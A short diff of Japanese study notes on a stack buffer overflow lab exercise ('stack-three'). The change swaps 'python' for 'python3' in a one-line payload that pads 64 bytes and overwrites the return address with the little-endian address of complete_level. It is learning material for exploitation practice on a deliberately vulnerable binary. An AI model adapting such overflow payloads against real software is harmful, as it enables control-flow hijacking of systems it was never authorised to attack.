@@ -3,7 +3,7 @@
 その上でcomplete_level関数のアドレスをリトルエンディアンにしてBOF。
 
 [入力方法]
-python -c 'import sys, struct; payload = b"A"*64 + struct.pack("<Q", 0x5555555551c9);
+python3 -c 'import sys, struct; payload = b"A"*64 + struct.pack("<Q", 0x5555555551c9);
      sys.stdout.buffer.write(payload)' | ./stack-three.out
 
 [解説]
